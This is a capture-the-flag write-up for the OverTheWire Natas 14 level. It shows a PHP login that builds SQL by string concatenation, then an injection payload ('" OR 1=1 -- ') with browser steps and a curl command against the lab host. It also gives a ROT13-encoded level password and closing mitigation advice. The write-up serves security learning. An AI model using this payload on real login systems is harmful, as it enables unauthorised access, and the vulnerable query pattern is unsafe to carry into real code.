# Write-up: Natas 14 → 15  
**Date:** 2025-12-14  

## Obfuscated password (ROT13)  
`FqdVdOfSpm3lbgyALReMFMjoyxz0yeik`

---

## OBJECTIVE

> This level demonstrates a basic **authentication bypass** using SQL injection. By exploiting the way SQL queries are built directly from user input, we can bypass password verification and trigger a successful login. This challenge is a textbook case of:
>
>- Poor input sanitization  
>- Vulnerable string concatenation in SQL  
>- Classic SQL injection via logical manipulation  
>
> Clicking “View sourcecode” reveals:

    if(array_key_exists("username", $_REQUEST)) {
        $link = mysqli_connect("localhost", "natas14", "<password>");
        mysqli_select_db($link, "natas14");

        $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";

        if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored>";
        } else {
            echo "Access denied!";
        }
    }

---

## PURPOSE

The SQL query is constructed unsafely by directly interpolating user-controlled input:

    SELECT * FROM users
    WHERE username="USERNAME" AND password="PASSWORD"

Because the input is concatenated into the query string without escaping or parameterization, an attacker can **break out of the quoted context** and inject additional SQL logic.

By injecting a condition that always evaluates to true, we can force the query to return at least one row, satisfying the login check.

For example:

    username = " OR 1=1 --
    password = anything

Resulting SQL:

    SELECT * FROM users
    WHERE username="" OR 1=1 -- " AND password="anything"

Everything after `--` is treated as a comment, so the effective query becomes:

    SELECT * FROM users WHERE 1=1

This returns rows unconditionally, resulting in a successful login.

---

## SOLUTION

### Manual (browser)

1. Open the login form.
2. Enter:
   - **Username:** `" OR 1=1 -- `
   - **Password:** anything (or blank)
3. Submit the form.

You will see:

    Successful login! The password for natas15 is <password>

---

### cURL

    curl -u natas14:<password> \
      -d 'username=" OR 1=1 -- ' \
      -d 'password=x' \
      http://natas14.natas.labs.overthewire.org/

---

## TAKEAWAYS

- **SQL injection** occurs when user input is directly embedded into SQL queries.
- Authentication logic that relies solely on query results is vulnerable to logic manipulation.
- Comment operators (`--`) can be used to bypass parts of a query.
- The correct mitigation is:
  - Use **prepared statements / parameterized queries**
  - Never concatenate raw user input into SQL
  - Treat all client input as untrusted
- This level is a canonical introduction to authentication bypass via SQL injection.

---

Writeup author: **Jeremy Ray Jewell**  
GitHub: https://github.com/jeremyrayjewell  
LinkedIn: https://www.linkedin.com/in/jeremyrayjewell
